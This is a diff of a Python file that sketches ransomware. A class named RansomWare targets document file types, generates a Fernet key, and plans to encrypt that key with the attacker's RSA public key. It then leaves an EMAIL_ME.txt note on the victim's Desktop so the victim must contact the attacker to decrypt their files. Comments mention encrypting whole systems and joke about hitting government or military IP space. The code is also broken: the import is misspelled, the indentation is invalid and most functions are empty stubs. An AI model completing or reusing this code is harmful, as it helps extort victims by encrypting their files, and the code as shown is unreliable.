@@ -1,52 +1,86 @@
-from cryptography.fernet import Fernet #used to encrypt files
-
-import os #to get root system
-
-
+# Import the necessary libraries
+from cryptoraphy.fernet import Fernet
+import os
 
 
-# declare a class called ransomeware
-class Ransomware:
 
-    #check if the filekey.key file exists
-    file_exists = os.path.isfile("")
+
+
+
+
+
+class RansomWare:
+
     
-    
+    # File exstensions to seek out and Encrypt
+    file_exts = [
+        '.txt', '.log', '.csv', '.doc', '.docx' '.xls', '.pdf', '.xlsx', '.ppt'
+        
+
+    ]
+
+
     def __init__(self):
-        # key that will be used to encrypt and decrypt files
+        # Key that will be used for Fernet object and encrypt/decrypt method
+        key_file_name = "secret.key"
 
-        #  Encrypte and decrypt files using Fernet symmetric encryption
+        self.key = Fernet.generate_key()
+            with open(self.key_file_name, "wb") as key_file:
+             key_file.write(self.key)
+        self.fernet = Fernet(self.key)
+             
+        # Encrypt/Decrypter
+        
+        # RSA public key used for encrypting/decrypting fernet object eg, Symmetric key
+        
 
-        # RSA public and private key pair to encrypt the symmetric key
-
-
-        """ Root directorys to start Encryption/Decryption from
+        ''' Root directorys to start Encryption/Decryption from
             CAUTION: Do NOT use self.sysRoot on your own PC as you could end up messing up your system etc...
             CAUTION: Play it safe, create a mini root directory to see how this software works it is no different
             CAUTION: eg, use 'localRoot' and create Some folder directory and files in them folders etc.
-        """
-
-        # use sysRoot to encrypt system files
-
-
-        # use localRoot to encrypt files in a test folder you created
-
-
-        # Get public IP of victim's machine
+        '''
+        # Use sysroot to create absolute path for files, etc. And for encrypting whole system
         
-        
+        # Use localroot to test encryption softawre and for absolute path for files and encryption of "test system"
+         # Debugging/Testing
+
+        # Get public IP of person, for more analysis etc. (Check if you have hit gov, military ip space LOL)
         
 
-    # define a function that will be used for fernet object, encrypt and decrypt method   
+
+    # Generates [SYMMETRIC KEY] on victim machine which is used to encrypt the victims data
     def generate_key(self):
-
-
-
-
+        # Generates a url safe(base64 encoded) key
+        
+        # Creates a Fernet object with encrypt/decrypt methods
+        
 
     
+    # Write the fernet(symmetric key) to text file
+    def write_key(self):
+        
 
 
+    # Encrypt [SYMMETRIC KEY] that was created on victim machine to Encrypt/Decrypt files with our PUBLIC ASYMMETRIC-
+    # -RSA key that was created on OUR MACHINE. We will later be able to DECRYPT the SYSMETRIC KEY used for-
+    # -Encrypt/Decrypt of files on target machine with our PRIVATE KEY, so that they can then Decrypt files etc.
+    def encrypt_fernet_key(self):
+        with open('fernet_key.txt', 'rb')
 
 
-# define a function used to generate symetric key used to encrypt data on victim's machine
+        with open('fernet_key.txt', 'wb') as f:
+            # Public RSA key
+            
+            # Public encrypter object
+            
+            # Encrypted fernet key
+            
+            # Write encrypted fernet key to file
+            
+        # Write encrypted fernet key to dekstop as well so they can send this file to be unencrypted and get system/files back
+        with open(f'{self.sysRoot}Desktop/EMAIL_ME.txt', 'wb') as fa:
+            
+        # Assign self.key to encrypted fernet key
+        
+        # Remove fernet crypter object
+        self.crypter = None
